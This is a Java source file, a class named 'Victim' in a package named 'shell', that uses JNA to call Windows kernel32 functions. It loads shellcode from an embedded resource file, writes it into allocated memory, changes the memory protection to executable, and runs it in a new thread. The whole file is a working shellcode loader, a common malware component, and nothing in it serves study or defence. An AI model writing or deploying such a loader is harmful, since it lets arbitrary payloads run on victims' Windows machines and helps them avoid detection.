package shell;

import com.sun.jna.Native;
import com.sun.jna.win32.StdCallLibrary;
import java.io.InputStream;

public class Victim {

    public interface Kernel32 extends StdCallLibrary {
        // We will load this inside main to be safer
        long VirtualAlloc(long lpAddress, long dwSize, int flAllocationType, int flProtect);
        long CreateThread(long lpThreadAttributes, long dwStackSize, long lpStartAddress, long lpParameter, int dwCreationFlags, long lpThreadId);
        int WaitForSingleObject(long hHandle, int dwMilliseconds);
        boolean VirtualProtect(long lpAddress, long dwSize, int flNewProtect, com.sun.jna.ptr.IntByReference lpflOldProtect);
    }

    public static void main(String[] args) {
        try {
            // Load JNA instance here
            Kernel32 k32 = Native.load("kernel32", Kernel32.class);

            System.out.println("[*] Extracting embedded payload...");
            InputStream is = Victim.class.getResourceAsStream("/data.dat");
            if (is == null) return;
            byte[] shellcode = is.readAllBytes();

            System.out.println("[*] Allocating memory...");
            long address = k32.VirtualAlloc(0, shellcode.length, 0x3000, 0x04);

            com.sun.jna.Pointer pointer = new com.sun.jna.Pointer(address);
            pointer.write(0, shellcode, 0, shellcode.length);

            com.sun.jna.ptr.IntByReference oldProtect = new com.sun.jna.ptr.IntByReference();
            k32.VirtualProtect(address, shellcode.length, 0x20, oldProtect);

            System.out.println("[*] Executing thread...");
            long threadHandle = k32.CreateThread(0, 0, address, 0, 0, 0);
            k32.WaitForSingleObject(threadHandle, -1);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
